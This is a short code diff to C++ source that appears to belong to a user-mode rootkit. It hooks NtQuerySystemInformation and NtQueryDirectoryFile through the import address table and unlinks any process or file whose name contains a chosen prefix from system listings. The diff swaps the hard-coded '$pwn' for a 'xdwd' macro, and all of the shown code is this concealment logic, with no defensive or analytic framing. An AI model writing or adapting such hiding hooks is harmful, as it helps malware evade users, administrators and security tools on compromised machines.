@@ -3,7 +3,7 @@
 
 #include "IAT Hook.h"
 #include "WinStruct.h"
-
+#define HIDE_PREFIX "xdwd"
 #define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
 
 using lpNtQuerySystemInformation = NTSTATUS (WINAPI *)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
@@ -31,7 +31,7 @@ NTSTATUS WINAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
 			wcstombs_s(nullptr, lpCurrentProcessName, lpNextProcess->ImageName.Buffer, MAX_PATH);
 			lpCurrentProcessName[MAX_PATH - 1] = '\0';
 
-			if (StrStrIA(lpCurrentProcessName, "$pwn"))
+			if (StrStrIA(lpCurrentProcessName, HIDE_PREFIX))
 			{
 				if (lpNextProcess->NextEntryOffset == 0)
 					lpCurrentProcess->NextEntryOffset = 0;
@@ -63,7 +63,7 @@ NTSTATUS WINAPI hkNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_
 			wcstombs_s(nullptr, lpCurrentDirectoryName, lpNextDirectory->FileName, MAX_PATH);
 			lpCurrentDirectoryName[MAX_PATH - 1] = '\0';
 
-			if (StrStrIA(lpCurrentDirectoryName, "$pwn"))
+			if (StrStrIA(lpCurrentDirectoryName, HIDE_PREFIX))
 			{
 				if (lpNextDirectory->NextEntryOffset == 0)
 					lpCurrentDirectory->NextEntryOffset = 0;
